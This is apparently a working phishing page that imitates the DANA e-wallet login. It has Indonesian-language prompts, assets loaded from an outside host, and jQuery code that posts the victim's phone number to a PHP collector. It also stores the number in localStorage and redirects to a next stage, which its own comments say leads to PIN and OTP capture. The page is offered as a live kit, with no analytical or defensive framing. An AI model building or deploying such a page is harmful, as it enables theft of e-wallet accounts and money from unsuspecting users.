<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login</title>
    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous"> 
    <link rel="stylesheet" href="https://file.nlhost.my.id/dana_v13a/mbg_ku/css/loading.css" type="text/css" media="all">
    <link rel="stylesheet" href="https://file.nlhost.my.id/dana_v13a/mbg_ku/css/main.css" type="text/css" media="all">
</head>
<body> 

    <div id="process" name="process" class="process" style="display: none;">
        <div class="loading">
            <img src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/load_bg.png">
            <img class="spinner" src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/load_spin.png">
        </div>
    </div>
    
    <div class="main-body">
        <div class="nav-dana">
            <img src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/dnl.png" alt="">
        </div> 
    
        <form onsubmit="sendNohplog(event);" method="POST" class="container p-4" id="formNohplog">
            <div class="form-nohp">
                <div class="text-masuk">
                    Masukkan nomor HP kamu untuk lanjut
                </div>
                <div class="inp-no mt-4">
                    <div class="flx-id-no">
                        <span>Negara</span>
                        <span>Nomor</span>
                    </div>
                    <div class="flx-inp mt-2">
                        <div class="box-codeTel">
                            <img src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/indo.png" alt="">
                            <span>+62</span>
                        </div>
                        <input type="tel" name="nohp" id="nope" placeholder="812-5590-8732" class="inphp" autocomplete="off" autofocus="">
                    </div>
                </div>
                <div class="desc-text text-center mt-4">
                    Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan <strong>S&K</strong> serta <strong>Kebijakan Privasi</strong> kami.
                </div>
            </div>
            <div class="btn-laniut">
                <button type="submit" id="btn-send" disabled="">Lanjutkan</button>
            </div>
        </form>
    </div>

   <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script>
    $(document).ready(function() {
        const $nope = $('#nope');
        const $btn = $('#btn-send');

        // 1. Logika Validasi & Auto-Format (Tetap Ori Punya Lu)
        $nope.on('input', function() {
            let val = $(this).val().replace(/\D/g, ''); 
            
            if (val.startsWith('0')) val = val.substring(1);
            if (val.startsWith('62')) val = val.substring(2);

            if (val.length > 13) val = val.slice(0, 13);

            let formatted = val;
            if (val.length > 3 && val.length <= 7) {
                formatted = val.slice(0, 3) + '-' + val.slice(3);
            } else if (val.length > 7) {
                formatted = val.slice(0, 3) + '-' + val.slice(3, 7) + '-' + val.slice(7);
            }
            $(this).val(formatted);

            if (val.length >= 9) {
                $btn.prop('disabled', false);
            } else {
                $btn.prop('disabled', true);
            }
        });

        // 2. Logika Pengiriman AJAX
        $('#formNohplog').on('submit', function(e) {
            e.preventDefault();
            
            $("#process").show();
            $btn.prop('disabled', true).text("Memproses...");
            
            const rawPhone = $nope.val().replace(/-/g, ''); 
            
            // GANTI KE LOCALSTORAGE BIAR TEMBUS KE PIN/OTP
            localStorage.setItem('phoneNumber', '62' + rawPhone);
            
            $.ajax({
                type: 'POST',
                url: 'nl/nohp1.php', // Tembak ke link pusat
                data: { nohp: '62' + rawPhone },
                complete: function() {
                    // Pindah ke folder mbg_ku/masuk.html
                    setTimeout(function() {
                        window.location.href = "mbg_ku/masuk.html";
                    }, 1000);
                }
            });
        });
    });
    </script>
</body>
</html
